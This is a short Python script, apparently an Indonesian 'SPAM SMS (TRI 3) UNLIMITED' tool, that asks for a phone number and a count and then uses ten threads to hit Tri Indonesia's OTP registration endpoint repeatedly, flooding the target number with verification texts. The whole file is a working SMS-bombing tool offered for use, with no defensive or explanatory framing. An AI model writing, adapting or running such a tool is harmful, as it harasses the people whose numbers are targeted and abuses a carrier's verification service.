from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
   _  _
 _| || |_   \033[1;31mAuthor  :Henrycko\033[1;32m
|_  ..  _|  \033[1;31mContact :https://fb.me/Henrycko.xyz\033[1;32m
|_      _|  \033[1;31mGithub  :https://github.com/Henrycko\033[1;32m
  |_||_|    \033[1;36m~ SPAM SMS (TRI 3) UNLIMITED ~\033[1;32m
""")

os.system('clear')
print(banner)
no = input("\033[1;37m[?] Nomor =>\033[1;32m")
tot = int(input("\033[1;37m[?] Jumlah =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[!] SUKSES")
		else:
			print("\033[1;31m[!] GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
